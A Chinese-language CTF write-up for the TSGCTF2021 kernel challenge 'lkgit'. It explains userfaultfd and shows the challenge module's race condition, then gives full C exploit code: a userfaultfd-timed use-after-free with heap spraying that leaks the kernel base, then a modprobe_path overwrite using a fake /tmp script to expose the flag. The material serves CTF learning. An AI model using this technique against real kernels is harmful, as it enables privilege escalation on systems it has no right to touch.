# TSGCTF2021-lkgit(userfaultfd)


# userfaultfd

userfaultfd，这是 kernel 中提供的一种特殊的处理 page fault 的机制，能够让用户态程序自行处理自己的 page fault.
它的调用方式是通过一个 userfaultfd 的 syscall 新建一个 fd，然后用 `ioctl` 等 syscall 来调用相关的API. 该机制的初衷是为了方便虚拟机的 live migration，其功能还处在不断改进和发展中，文档和资料都不是很多。

## 工作流程和用法

![](https://gitee.com/slientNoir/image-bed/raw/master/image-bed/2022-01-03-2ecfb1460d95a834c43c0facd58e3b42-850e4e.png)

### 分配一个userfault fd 并检查 API

```c
 /* Create and enable userfaultfd object */

uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
if (uffd == -1)
   errExit("userfaultfd");

uffdio_api.api = UFFD_API;
uffdio_api.features = 0;
if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
   errExit("ioctl-UFFDIO_API");
```

### 注册需要进行 userfault 的内存区域

```c
/* Register the memory range of the mapping we just created for
          handling by the userfaultfd object. In mode, we request to track
          missing pages (i.e., pages that have not yet been faulted in). */

uffdio_register.range.start = (unsigned long) addr;
uffdio_register.range.len = len;
uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
   errExit("ioctl-UFFDIO_REGISTER");
```

### 创建 monitor 线程监听 fd 的事件（）

在一个 for 循环中，不断使用 pool 来等待这个 fd ，然后读取一个 msg，这里读取的 msg 就是 `uffd_msg` 结构。

```c
for (;;) {

   /* See what poll() tells us about the userfaultfd */

   struct pollfd pollfd;
   int nready;
   pollfd.fd = uffd;
   pollfd.events = POLLIN;
   nready = poll(&pollfd, 1, -1);
   if (nready == -1)
       errExit("poll");

   printf("\nfault_handler_thread():\n");
   printf("    poll() returns: nready = %d; "
           "POLLIN = %d; POLLERR = %d\n", nready,
           (pollfd.revents & POLLIN) != 0,
           (pollfd.revents & POLLERR) != 0);

   /* Read an event from the userfaultfd */

   nread = read(uffd, &msg, sizeof(msg));
   if (nread == 0) {
       printf("EOF on userfaultfd!\n");
       exit(EXIT_FAILURE);
   }

   if (nread == -1)
       errExit("read");
```

### 主线程出发指定区域的 page fault

访问该区域的内存即可

### 自线程处理 fault

调用 `UFFDIO_COPY` 为新映射的页提供数据，并唤醒主线程，子线程自身会进入到下一轮循环中继续 poll 等待输入

```c
/* Copy the page pointed to by 'page' into the faulting
  region. Vary the contents that are copied in, so that it
  is more obvious that each fault is handled separately. */

memset(page, 'A' + fault_cnt % 20, page_size);
fault_cnt++;

uffdio_copy.src = (unsigned long) page;

/* We need to handle page faults in units of pages(!).
  So, round faulting address down to page boundary */

uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                  ~(page_size - 1);
uffdio_copy.len = page_size;
uffdio_copy.mode = 0;
uffdio_copy.copy = 0;
if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
   errExit("ioctl-UFFDIO_COPY");
```

在处理userfaultfd的时，触发 page fault 的进程被阻塞，执行我们的处理程序。这样可以提高条件竞争的几率。

# Challenge: lkgit

这是一道kernel pwn使用了很标准的 userfaultfd 来为条件竞争创造条件。来自TSGCTF2021。关于条件竞争这里就不再赘述了。

国外的比赛大都提供了源代码（Nice！）

lkgit在linux 内核中模仿了一个git。用户提交 content 和 msg，内核返回 content 的哈希。通过 hash 来定位一个对象，进行查/改。如果新提交的对象的 hash 与旧的相同，则旧的对象会被free。

它通过一个全局变量数组来维护所有的对象，但每个对全局变量的操作都没有加锁。这表明我们可以达成 UAF。

由于开启了KASLR，所以需要先泄漏内核的地址。在`lkgit_get_object`中有四次与用户态数据的交互。第一次，用户`req->hash`，取出对应的对象。将conent返回用户`req->content`接着检查了content与hash是否对应。之后将message和hash返回。

```c
static long lkgit_get_object(log_object *req) {
	long ret = -LKGIT_ERR_OBJECT_NOTFOUND;
	char hash_other[HASH_SIZE] = {0};
	char hash[HASH_SIZE];
	int target_ix;
	hash_object *target;
	if (copy_from_user(hash, req->hash, HASH_SIZE))
		goto end;

	if ((target_ix = find_by_hash(hash)) != -1) {
		target = objects[target_ix];
		if (copy_to_user(req->content, target->content, FILE_MAXSZ))	// 0x40
			goto end;

		// validity check of hash
		get_hash(target->content, hash_other);
		if (memcmp(hash, hash_other, HASH_SIZE) != 0)
			goto end;

		if (copy_to_user(req->message, target->message, MESSAGE_MAXSZ))
			goto end;
		if (copy_to_user(req->hash, target->hash, HASH_SIZE)) 
			goto end;
		ret = 0;
	}

end:
	return ret;
}
```

我们必须保证检查hash的正确性，所以要在`copy_to_user(req->message)`时，将这个对象free。free之后这个内存object中会包含内核地址信息，从而leak kernbase。下面是一个思路（来自[Kileak](https://kileak.github.io/ctf/2021/tsg-lkgit/)）：

```c
request object
      ||
      ||
      \/
lkgit_get_object
      ||
      ||
      \/
 find_by_hash
      ||
      ||
      \/
 copy_to_user(content)    
      ||
      ||
      \/
 copy_to_user(message)
      ||
      ||     (page fault)
      ||==============================> userfaulthandler (break on read)
                                                   ||
                                                   ||
                                                   \/
                                            delete current object
                                                   ||
                                                   ||
                                                   \/
                                            		heap spray
                                                   ||
                                                   ||
      ||<============================================                                             
      ||
      ||
      \/
 copy_to_user(hash)
```

一个触发脚本。

```c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>
#include <malloc.h>

#include "./src/include/lkgit.h"

#define PAGE_SIZE 4096

void die(const char *msg) {
    fprintf(stderr,msg,strlen(msg),0);
    exit(-1);
}

int global_fd;
int fds[0x80];
void *basepage = NULL;
uint64_t kernbase = 0;
uint64_t modprobe_path = 0;
hash_object *req1 = NULL;
log_object *req2 = NULL;

static void fault_handler_thread(void *arg) {
    puts("[+] entered fault_handler_thread!");

    static struct uffd_msg msg;
    struct uffdio_copy uc; 
    uint64_t uffd = (uint64_t)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    puts("[+] polling...");
    while ((nready = poll(&pollfd, 1, -1)) > 0) {
        if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
            die("[!] poll failed\n");
        }
        if ((read(uffd, &msg, sizeof(msg))) == 0) {
            die("[!] read uffd msg failed\n");
        }
        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            die("[!] unexpected pagefault\n");
        }

        printf("[+] page fault: %p\n", (void *)msg.arg.pagefault.address);
        puts("[+] Now free this object");

        ioctl(global_fd, LKGIT_HASH_OBJECT, req1);
        puts("[+] heap spray...");
        for (int i = 0; i < 0x80; i++) {
            fds[i] = open("/proc/self/stat", O_RDONLY);
        }
        uc.src = (unsigned long)basepage;
        uc.len = PAGE_SIZE;
        uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
        uc.mode = 0;
        uc.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uc) == -1) {          
            die("[!] ioctl-UFFDIO_COPY");
        }

        break;

    }
    puts("[+] exit fault_handler_thread!");
}

void RegisterUserfault(void *fault_page,void *handler) {
    pthread_t phr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uufd;
    int s;

    uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uufd < 0) {
        die("[!] Failed to register userfaultfd\n");
    }

    ua.api = UFFD_API;
    ua.features = 0;

    if (ioctl(uufd, UFFDIO_API, &ua) == -1) {
        die("[!] Failed ioctl UFFDIO_API\n");
    }

    ur.range.start = (unsigned long) fault_page;
    ur.range.len = PAGE_SIZE;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uufd, UFFDIO_REGISTER, &ur) == -1) {
        die("[!] Failed ioctl UFFDIO_REGISTER\n");
    }

    s = pthread_create(&phr, NULL, handler, (void *)uufd);
    if (s != 0) {
        die("[!] Failed pthread_create\n");
    }
}

int main() {
    global_fd = open("/dev/lkgit", O_RDWR);
    if(global_fd < 0) {
        die("[!] Couldn't open /dev/lkgit\n");
    }

    void *target;
    req1 = calloc(1, sizeof(hash_object));

    req1->content = calloc(1, FILE_MAXSZ);
    req1->message = calloc(1, MESSAGE_MAXSZ);
    memset(req1->content, 'A', FILE_MAXSZ);
    memset(req1->message, 'B', MESSAGE_MAXSZ);
    ioctl(global_fd, LKGIT_HASH_OBJECT, req1);
    puts("[+] Normal commit");
    printf("[+] req1->hash = %s\n", req1->hash);
    assert((void *)req1->hash == (void *)req1);
    
    basepage = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    target = mmap(NULL, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    RegisterUserfault(target + PAGE_SIZE, fault_handler_thread);
    printf("[+] mmap address: %p\n", target);
    req2 = target - HASH_SIZE - FILE_MAXSZ + PAGE_SIZE;
    memcpy(req2->hash, req1->hash, HASH_SIZE);
    ioctl(global_fd, LKGIT_GET_OBJECT, req2);
    kernbase = *(unsigned long *)req2->hash - 0x1adc20;
    modprobe_path = kernbase + 0xc3cb20;

    printf("[+] kernel base --> %lx\n", kernbase);
    printf("[+] modprobe_path --> %lx\n", modprobe_path);

}
```

之后，我们希望通过修改`modprobe_path`来读取flag。需要找到一处控制内存的地方。在`lkgit_amend_message`中：

```c
static long lkgit_amend_message(log_object *reqptr) {
	long ret = -LKGIT_ERR_OBJECT_NOTFOUND;
	char buf[MESSAGE_MAXSZ];
	log_object req = {0};
	int target_ix;
	hash_object *target;
	if(copy_from_user(&req, reqptr->hash, HASH_SIZE))
		goto end;

	if ((target_ix = find_by_hash(req.hash)) != -1) {
		target = objects[target_ix];
		// save message temporarily
		if (copy_from_user(buf, reqptr->message, MESSAGE_MAXSZ))
			goto end;
		// return old information of object
		ret = lkgit_get_object(reqptr);
		// amend message
		memcpy(target->message, buf, MESSAGE_MAXSZ);
	}

	end:
		return ret;
}
```

这里同样有访问用户态内存`reqptr->message`。所以，我们也是可以在这里使用userfaultfd。

那么如何控制这里的`target->message`？首先可以free这个块，一个`hash_object`的大小与一个`message`的大小相同，而在申请时，顺序是这样的：

```c
	char *content_buf = kzalloc(FILE_MAXSZ, GFP_KERNEL);	// 0x40
	char *message_buf = kzalloc(MESSAGE_MAXSZ, GFP_KERNEL);	// 0x20
	hash_object *req = kzalloc(sizeof(hash_object), GFP_KERNEL);
```

free之后，可以再次通过添加一个obj，使得`message_buf`复用这块空间。而target已经被取出，我们可以通过控制`message`的指针达到任意地址写。

# The full exp

```c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>
#include <malloc.h>

#include "./src/include/lkgit.h"

#define PAGE_SIZE 4096

void die(const char *msg) {
    fprintf(stderr,msg,strlen(msg),0);
    exit(-1);
}

int global_fd;
int fds[0x80];
void *basepage = NULL;
uint64_t kernbase = 0;
uint64_t modprobe_path = 0;
hash_object *req = NULL;
log_object *logobj = NULL;

char* hash_to_string(char *hash) {
  char *hash_str = calloc(HASH_SIZE * 2 + 1, 1);
  for(int ix = 0; ix != HASH_SIZE; ++ix) {
    sprintf(hash_str + ix*2, "%02lx", (unsigned long)(unsigned char)hash[ix]);
  }
  return hash_str;
}

static void fault_handler_thread(void *arg) {
    puts("[+] entered fault_handler_thread!");

    static struct uffd_msg msg;
    static int fault_cnt = 0;
    struct uffdio_copy uc; 
    uint64_t uffd = (uint64_t)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    puts("[+] polling...");
    while ((nready = poll(&pollfd, 1, -1)) > 0) {
        if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
            die("[!] poll failed\n");
        }
        if ((read(uffd, &msg, sizeof(msg))) == 0) {
            die("[!] read uffd msg failed\n");
        }
        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            die("[!] unexpected pagefault\n");
        }

        printf("[+] page fault: %p\n", (void *)msg.arg.pagefault.address);
        if (fault_cnt++ == 0) {
          // fisrt page fault, we free this object and leak kernel address
            puts("[+] Now free this object");
            ioctl(global_fd, LKGIT_HASH_OBJECT, req);
            puts("[+] heap spray...");
            for (int i = 0; i < 0x80; i++) {
                fds[i] = open("/proc/self/stat", O_RDONLY);
            }
        } else {
          // second page fault, we free it and allocate a new one.
          // new object's message will point to the target we are appending.
            puts("[+] Now free this object");
            ioctl(global_fd, LKGIT_HASH_OBJECT, req);

            puts("[+] Allocate new object");
            for (int i = 0; i < MESSAGE_MAXSZ / sizeof(uint64_t); i++) {
                *((uint64_t *)req->message + i) = modprobe_path;
            }
            ioctl(global_fd, LKGIT_HASH_OBJECT, req);
        }
        // use uffdio_copy to write request's message
        uc.src = (unsigned long)basepage;
        uc.len = PAGE_SIZE;
        uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
        uc.mode = 0;
        uc.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uc) == -1) {          
            die("[!] ioctl-UFFDIO_COPY");
        }

        break;

    }
    puts("[+] exit fault_handler_thread!");
}

void get_flag(void){
    puts("[*] Setting up for fake modprobe");
    
    system("echo '#!/bin/sh\nchmod 777 /home/user/flag' > /tmp/niebelungen");
    system("chmod +x /tmp/niebelungen");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /home/user/flag");

    exit(0);
}

void RegisterUserfault(void *fault_page,void *handler) {
    pthread_t phr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uufd;
    int s;

    uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uufd < 0) {
        die("[!] Failed to register userfaultfd\n");
    }

    ua.api = UFFD_API;
    ua.features = 0;

    if (ioctl(uufd, UFFDIO_API, &ua) == -1) {
        die("[!] Failed ioctl UFFDIO_API\n");
    }

    ur.range.start = (unsigned long) fault_page;
    ur.range.len = PAGE_SIZE;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uufd, UFFDIO_REGISTER, &ur) == -1) {
        die("[!] Failed ioctl UFFDIO_REGISTER\n");
    }

    s = pthread_create(&phr, NULL, handler, (void *)uufd);
    if (s != 0) {
        die("[!] Failed pthread_create\n");
    }
}

int main() {
    global_fd = open("/dev/lkgit", O_RDWR);
    if(global_fd < 0) {
        die("[!] Couldn't open /dev/lkgit\n");
    }
    // part 1: UAF
    void *target;
    req = calloc(1, sizeof(hash_object));
    // this is a normal commit
    req->content = calloc(1, FILE_MAXSZ);
    req->message = calloc(1, MESSAGE_MAXSZ);
    memset(req->content, 'A', FILE_MAXSZ);
    memset(req->message, 'B', MESSAGE_MAXSZ);
    puts("[+] Normal commit");
    ioctl(global_fd, LKGIT_HASH_OBJECT, req);
    printf("[+] req->hash = %s\n", hash_to_string(req->hash));
    
    basepage = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    target = mmap(NULL, 4 * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    RegisterUserfault(target + PAGE_SIZE, fault_handler_thread);
    printf("[+] mmap address: %p\n", target);
    logobj = target - HASH_SIZE - FILE_MAXSZ + PAGE_SIZE;
    memcpy(logobj->hash, req->hash, HASH_SIZE);
    // the message is in the second page, when kernel access it --> page fault
    ioctl(global_fd, LKGIT_GET_OBJECT, logobj);
    kernbase = *(unsigned long *)logobj->hash - 0x1adc20;
    modprobe_path = kernbase + 0xc3cb20;

    printf("[+] kernel base --> 0x%lx\n", kernbase);
    printf("[+] modprobe_path --> 0x%lx\n", modprobe_path);

    // part 2: AAW
    // use the UAF to control message pointer
    strcpy(basepage, "/tmp/niebelungen\x00");
    memset(req->content, 0, FILE_MAXSZ);
    memset(req->message, 0, MESSAGE_MAXSZ);
    strcpy(req->content, "/tmp/niebelungen\x00");
    ioctl(global_fd, LKGIT_HASH_OBJECT, req);
    printf("[+] req->hash = %s\n", hash_to_string(req->hash));

    RegisterUserfault(target + 3 * PAGE_SIZE, fault_handler_thread);
    logobj = target - HASH_SIZE - FILE_MAXSZ + 3 * PAGE_SIZE;
    memcpy(logobj->hash, req->hash, HASH_SIZE);
    ioctl(global_fd, LKGIT_AMEND_MESSAGE, logobj);

    get_flag();    
}
```

这个题目是[smallkirby](https://smallkirby.hatenablog.com/about)师傅在TSGCTF2021上出的，他将这个题目放入了新手入门的推荐中。可惜，师傅的blog都是日语，即使翻译过来也无法通顺的理解。而kileak师傅虽然思路很详细，但是省略了很重要的userfaultfd部分。作为刚入门新手，完整的做出整个题目花费了不少时间。

